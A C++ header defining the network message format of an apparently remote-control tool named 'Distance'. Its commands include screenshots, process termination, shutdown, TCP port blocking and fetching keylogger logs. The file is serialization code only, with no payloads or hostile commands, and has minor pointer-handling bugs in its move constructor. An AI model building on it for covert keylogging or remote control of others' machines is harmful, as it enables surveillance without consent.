//------------------------------------------------------------------------------
// ╔═══╗╔══╗╔═══╗╔════╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
// ╚╗╔╗║╚╣─╝║╔═╗║║╔╗╔╗║║╔═╗║║║╚╗║║║╔═╗║║╔══╝
// ─║║║║─║║─║╚══╗╚╝║║╚╝║║─║║║╔╗╚╝║║║─╚╝║╚══╗
// ─║║║║─║║─╚══╗║──║║──║╚═╝║║║╚╗║║║║─╔╗║╔══╝
// ╔╝╚╝║╔╣─╗║╚═╝║──║║──║╔═╗║║║─║║║║╚═╝║║╚══╗
// ╚═══╝╚══╝╚═══╝──╚╝──╚╝─╚╝╚╝─╚═╝╚═══╝╚═══╝
// 
// Copyright Ⓒ 0xlay. All rights reserved.
// 
// This source file is licensed under the terms of MIT license.
// For details, please read the LICENSE file.
// 
// File: Message.hpp
// 
// Creator: 0xlay
// 
// Environment: User mode only
//
// Module: Network.lib
//
//------------------------------------------------------------------------------

#pragma once

#include <string>
#include <vector>


namespace Distance::Network
{
    enum class MsgType
    {
        Error,

        //
        // SysInfo module
        //
        GetSysInfo,

        //
        // ProcessManger module
        //
        GetProcessList,
        TerminateProcess,

        //
        // Media module
        //
        GetScreenshot,

        //
        // PowerManager module
        //
        ShutdownPC,
        RebootPC,

        //
        // DistanceKeyLogger
        //
        GetKeyLoggerLogs,

        //
        // Netfilter module
        //
        BlockTcpPorts,
        UnblockTcpPorts

    };


    /*
    * @brief The MessageHeader stores information about a message
    */
    struct MessageHeader
    {
        MsgType type{};
        size_t size{};
        bool isErrorMsg{};
    };


    /*
    * @brief The Message is buffer for keeps POD, std::string and std::wstring data
    */
    class Message final
    {
    public:
        //
        // Constructors
        //

        Message(MsgType type = MsgType::Error, size_t size = 0)
            : memory_(sizeof(MessageHeader) + size),
              header_(reinterpret_cast<MessageHeader*>(&memory_[0])),
              it_(0)
        {
            header_->type = type;
            header_->size = size;
            header_->isErrorMsg = false;
        }

        Message(const Message& other)
        {
            memory_ = other.memory_;
            header_ = reinterpret_cast<MessageHeader*>(&memory_[0]);
        }

        Message(Message&& other) noexcept
        {
            memory_ = std::move(other.memory_);
            std::swap(header_, other.header_);
        }

        //
        // Operators
        //

        Message& operator = (const Message& other)
        {
            if (&other != this)
            {
                memory_ = other.memory_;
                header_ = reinterpret_cast<MessageHeader*>(&memory_[0]);
            }
            return *this;
        }

        Message& operator = (Message&& other) noexcept
        {
            if (&other != this)
            {
                memory_ = std::move(other.memory_);
                header_ = other.header_;
                other.header_ = nullptr;
            }
            return *this;
        }

        //
        // Methods
        //

        void resize(size_t newSize)
        {
            memory_.resize(sizeof(MessageHeader) + newSize);
            header_ = reinterpret_cast<MessageHeader*>(&memory_[0]);
            header_->size = newSize;
        }

        void extend(size_t extSize)
        {
            resize(size() + extSize);
        }

        void clear()
        {
            resize(0);
            it_ = 0;
            memset(&memory_[0], 0, memory_.capacity());
        }

        void setMsgHeader(const MessageHeader& header)
        {
            *header_ = header;
        }

        [[nodiscard]] MessageHeader getMsgHeader() const
        {
            return *header_;
        }

        [[nodiscard]] const std::vector<char>& getMemory() const
        {
            return memory_;
        }

        [[nodiscard]] std::vector<char>& getMemory()
        {
            return memory_;
        }

        [[nodiscard]] const char* getMsgInBytes() const
        {
            return &memory_[sizeof(MessageHeader)];
        }

        [[nodiscard]] char* getMsgInBytes()
        {
            return &memory_[sizeof(MessageHeader)];
        }

        [[nodiscard]] size_t size() const
        {
            return header_->size;
        }
        
        [[nodiscard]] size_t capacity() const
        {
            return memory_.capacity();
        }

        void setMsgType(MsgType type)
        {
            header_->type = type;
        }

        [[nodiscard]] MsgType getMsgType() const
        {
            return header_->type;
        }

        void markAsErrorMsg()
        {
            header_->isErrorMsg = true;
        }

        void unmarkAsErrorMsg()
        {
            header_->isErrorMsg = false;
        }

        [[nodiscard]] bool isErrorMsg() const
        {
            return header_->isErrorMsg;
        }

        //
        // Global operators
        //

        template <class PodType>
        friend Message& operator << (Message& msg, const PodType& object)
        {
            return msg.copyFrom(object);
        }

        template <class PodType>
        friend Message& operator >> (Message& msg, PodType& object)
        {
            return msg.copyTo(object);
        }

    // Private methods
    private:
        template <class DataType>
        Message& copyFrom(const DataType& object);
        Message& copyFrom(const char* object);
        Message& copyFrom(const wchar_t* object);

        template <class DataType>
        Message& copyTo(DataType& object);

    // Private data
    private:
        std::vector<char> memory_;
        MessageHeader* header_;
        size_t it_;
    };

    ////////////////////////////////////////////////////////////////////////////
    //
    // The Message::copyFrom methods implementation
    //
    ////////////////////////////////////////////////////////////////////////////

    template <class DataType>
    inline Message& Message::copyFrom(const DataType& object)
    {
        static_assert(std::is_standard_layout_v<DataType> &&\
                      !std::is_array_v<DataType>,
                      "The \'Message\' is supporting only: char, int, float, "
                      "double, const char*, const wchar_t*, std::string, "
                      "std::wstring or std::vector!");
        it_ = size();
        extend(sizeof(object));
        std::memcpy(getMsgInBytes() + it_, &object, sizeof(object));
        return *this;
    }

    template<>
    inline Message& Message::copyFrom(const std::string& object)
    {
        it_ = size();
        extend(object.size());
        std::memcpy(getMsgInBytes() + it_,
                    object.data(), 
                    object.size());
        return *this;
    }

    template<>
    inline Message& Message::copyFrom(const std::wstring& object)
    {
        it_ = size();
        extend(object.size() * sizeof(wchar_t));
        std::memcpy(getMsgInBytes() + it_,
                    object.data(),
                    object.size() * sizeof(wchar_t));
        return *this;
    }

    
    inline Message& Message::copyFrom(const char* object)
    {
        it_ = size();
        const size_t size = strlen(object);
        extend(size);
        std::memcpy(getMsgInBytes() + it_, object, size);
        return *this;
    }

    inline Message& Message::copyFrom(const wchar_t* object)
    {
        it_ = size();
        const size_t size = wcslen(object) * sizeof(wchar_t);
        extend(size);
        std::memcpy(getMsgInBytes() + it_, object, size);
        return *this;
    }

    template <>
    inline Message& Message::copyFrom(const std::vector<char>& object)
    {
        it_ = size();
        extend(object.size());
        std::memcpy(getMsgInBytes() + it_,
                    object.data(),
                    object.size());
        return *this;
    }

    ////////////////////////////////////////////////////////////////////////////
    //
    // The Message::copyTo methods implementation
    //
    ////////////////////////////////////////////////////////////////////////////

    template <class DataType>
    inline Message& Message::copyTo(DataType& object)
    {
        static_assert(std::is_standard_layout_v<DataType> &&\
                      !std::is_array_v<DataType>,
                      "The \'Message\' is supporting only: char, int, float, "
                      "double, std::string, std::wstring or std::vector!");

        std::memcpy(&object, getMsgInBytes(), sizeof(object));
        clear();
        return *this;
    }

    template <>
    inline Message& Message::copyTo(std::string& object)
    {
        object = std::string(getMsgInBytes(), size());
        clear();
        return *this;
    }

    template <>
    inline Message& Message::copyTo(std::wstring& object)
    {
        object = std::wstring(reinterpret_cast<wchar_t*>(getMsgInBytes()), 
                              size() / sizeof(wchar_t));
        clear();
        return *this;
    }

    template <>
    inline Message& Message::copyTo(std::vector<char>& object)
    {
        object.resize(size());
        memcpy(object.data(), getMsgInBytes(), size());
        clear();
        return *this;
    }

} // Distance::Network